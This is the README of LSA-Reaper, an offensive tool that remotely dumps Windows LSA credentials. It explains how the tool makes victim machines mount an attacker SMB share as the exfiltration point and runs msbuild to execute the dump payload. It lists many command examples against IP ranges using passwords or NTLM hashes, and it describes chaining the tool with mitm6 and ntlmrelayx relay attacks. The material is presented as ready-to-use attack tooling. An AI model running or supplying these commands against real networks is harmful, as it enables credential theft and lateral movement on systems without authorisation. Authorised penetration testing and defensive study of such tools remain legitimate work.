# LSA-Reaper
<p align="center">
  <img width="400" height="400" src="/assets/lsareaper.png">
</p>

LSA-Reaper is a remote command line LSA dumping tool that uses [Impacket's](https://github.com/SecureAuthCorp/impacket) wmiexec or atexec.

## Requirements
```
Linux
Impacket
pip pypykatz
pip netifaces
pip python-nmap
pip Pebble
Samba
```

## Installation
```
git clone https://github.com/samiam1086/LSA-Reaper.git
cd LSA-Reaper
sudo python3 -m pip install -r requirements.txt
cd ..
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
sudo python3 setup.py install
```
or
```
git clone https://github.com/samiam1086/LSA-Reaper.git
cd LSA-Reaper
sudo sh setup.sh
```

## Methodology
LSA-Reaper will begin by ping sweeping all provided IPs or IP ranges for alive hosts. LSA-Reaper will then create a SMB share with a random username and password that will act as the exfiltration point. LSA-Reaper will then execute the net use command on the victim machine via wmiexec or atexec to make the victim machine mount the share as a network drive and then execute msbuild to execute the payload which will dump LSA and save it to the mounted SMB share.

## Usage
```
sudo python3 lsa-reaper.py
```
![](/assets/hlp.png)

## Examples
```
sudo python3 lsa-reaper.py domain/user:'Password'@ip

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.100

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.0/24

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.10-200

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@ipList.txt

sudo python3 lsa-reaper.py testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -hashes 'LMHASH:NTHASH' testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -ip local_ip testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -drive A testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -localauth localuser@10.0.0.100
```

![](/assets/Reaper-Running.png)

![](/assets/example.png)

## Usage with Impacket's ntlmrelayx
First things first you need to run mitm6 and ntlmrelayx

![](/assets/mitm6run.png)

![](/assets/relayrun.png)

Once these are running you should begin to receive connections. These can be checked using the ```socks``` command within ntlmrelayx. Once you have gotten a connection with Admin Status of True you are good to get the ball rolling.

![](/assets/sockconnection.png)

With this connection we no longer need ntlmrelayx gathering connection so we can run the command ```stopservers```

![](/assets/stopservers.png)

Now we need to modify our proxychains.conf in /etc/ (It may be called proxychains4.conf). This is because the ```-socks``` argument on ntlmrelayx starts a socks4 server on local port 1080.

![](/assets/proxychains.png)

With this set and saved we can move to LSA-Reaper.

Run smbexec-modified.py through proxychains.

![](/assets/smbexecrun.png)
